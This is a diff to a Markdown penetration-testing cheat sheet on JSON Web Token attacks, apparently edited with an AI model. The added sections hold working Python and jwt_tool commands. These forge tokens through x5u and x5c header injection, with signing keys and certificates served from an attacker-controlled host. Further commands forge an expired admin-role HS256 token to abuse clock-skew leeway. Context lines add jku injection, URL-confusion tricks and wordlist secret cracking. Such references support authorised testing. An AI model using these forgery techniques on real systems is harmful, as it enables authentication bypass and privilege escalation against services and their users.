@@ -328,9 +328,9 @@ echo "<header>.<payload>."
 
 ---
 
-## `jku` / `x5u` Header Injection
+## `jku` / `x5u` / `x5c` Header Injection
 
-If server fetches keys from the URL in the `jku` header, point it at your server.
+If server fetches keys from a URL in the token header, point it at your server. Three header variants — all same concept, different key format.
 
 ```bash
 # Step 1: Generate RSA keypair and JWKS
@@ -367,6 +367,49 @@ python3 jwt_tool.py <token> -X s -ju "http://<attacker-ip>:8000/jwks.json"
 # Try: https://<trusted-domain>@<attacker-ip>/jwks.json
 # Try: https://<trusted-domain>.attacker.com/jwks.json
 # Or combine with open redirect on target
+
+# x5u — server fetches X.509 cert from URL and uses public key from cert
+# Same attack as jku but server expects a PEM-encoded certificate at the URL, not JWKS
+python3 << 'EOF'
+from cryptography import x509
+from cryptography.x509.oid import NameOID
+from cryptography.hazmat.primitives.asymmetric import rsa
+from cryptography.hazmat.primitives import serialization, hashes
+from cryptography.hazmat.backends import default_backend
+import datetime, base64, json
+
+# Generate key + self-signed cert
+priv = rsa.generate_private_key(public_exponent=65537, key_size=2048)
+pub = priv.public_key()
+subject = issuer = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, u"attacker")])
+cert = (x509.CertificateBuilder()
+    .subject_name(subject).issuer_name(issuer)
+    .public_key(pub).serial_number(x509.random_serial_number())
+    .not_valid_before(datetime.datetime.utcnow())
+    .not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(days=365))
+    .sign(priv, hashes.SHA256()))
+
+with open("/tmp/attacker.crt", "wb") as f:
+    f.write(cert.public_bytes(serialization.Encoding.PEM))
+with open("/tmp/attacker.key", "wb") as f:
+    f.write(priv.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8, serialization.NoEncryption()))
+print("Cert and key written to /tmp/")
+EOF
+# Host cert: python3 -m http.server 8000 --directory /tmp
+# Forge token with x5u pointing to your cert:
+python3 jwt_tool.py <token> -I -hc x5u -hv "http://<attacker-ip>:8000/attacker.crt" -T -S rs256 -pr /tmp/attacker.key
+
+# x5c — embed certificate chain directly in header (no URL fetch)
+# Server uses public key from the embedded cert to verify — inject your own cert
+python3 << 'EOF'
+import base64, json
+# Base64-encode the DER form of the cert (not PEM — strip headers and decode)
+with open("/tmp/attacker.crt") as f:
+    pem = f.read()
+der_b64 = pem.strip().replace("-----BEGIN CERTIFICATE-----","").replace("-----END CERTIFICATE-----","").replace("\n","")
+print(f'"x5c": ["{der_b64}"]')
+# Add this to JWT header, sign with matching private key
+EOF
 ```
 
 ---
@@ -408,6 +451,55 @@ python3 jwt_tool.py <token> -C -d /usr/share/wordlists/rockyou.txt
 # Scan endpoint for JWT vulnerabilities
 python3 jwt_tool.py <token> -t "https://<target>/api/profile" -rh "Authorization: Bearer <token>" -M pb
 ```
+
+---
+
+## Clock Skew — `exp` / `nbf` Tolerance Bypass
+
+Many JWT libraries allow a configurable leeway window (typically ±5 minutes) around `exp` and `nbf` to account for clock drift between services. You can abuse this to:
+
+- **Use expired tokens** — tokens expired within the leeway window may still validate
+- **Pre-activate tokens** — `nbf` (not-before) set slightly in the future still accepted within leeway
+
+```bash
+# Check current exp value
+python3 -c "
+import base64, json, time
+t = '<token>'.split('.')
+p = json.loads(base64.urlsafe_b64decode(t[1] + '=='))
+exp = p.get('exp'); nbf = p.get('nbf')
+now = int(time.time())
+print(f'now:  {now}')
+print(f'exp:  {exp}  (diff: {exp - now}s)' if exp else 'exp: not set')
+print(f'nbf:  {nbf}  (diff: {nbf - now}s)' if nbf else 'nbf: not set')
+"
+
+# Forge token with exp just expired (within 5 min window) — some servers accept
+python3 << 'EOF'
+import hmac, hashlib, base64, json, time
+
+secret = b"secret"
+header = {"alg": "HS256", "typ": "JWT"}
+payload = {
+    "sub": "1",
+    "role": "admin",
+    "exp": int(time.time()) - 60,   # expired 60s ago — within ±5min leeway
+    "nbf": int(time.time()) - 300
+}
+
+def b64url(d):
+    return base64.urlsafe_b64encode(json.dumps(d, separators=(',',':')).encode()).rstrip(b'=').decode()
+
+h, p = b64url(header), b64url(payload)
+sig = hmac.new(secret, f"{h}.{p}".encode(), hashlib.sha256).digest()
+print(f"{h}.{p}.{base64.urlsafe_b64encode(sig).rstrip(b'=').decode()}")
+EOF
+
+# jwt_tool — modify exp claim then sign
+python3 jwt_tool.py <token> -I -pc exp -pv 9999999999 -S hs256 -p "<secret>"
+```
+
+> [!note] The default leeway in many libraries (PyJWT, jsonwebtoken, java-jwt) is 0 but apps often set it to 60-300s. Worth testing with tokens expired 1-5 minutes ago before assuming exp is enforced.
 
 ---
 
@@ -462,5 +554,5 @@ python3 jwt_tool.py <token> -X -v
 ---
 
 *Created: 2026-03-04*
-*Updated: 2026-05-13*
+*Updated: 2026-05-14*
 *Model: claude-sonnet-4-6*
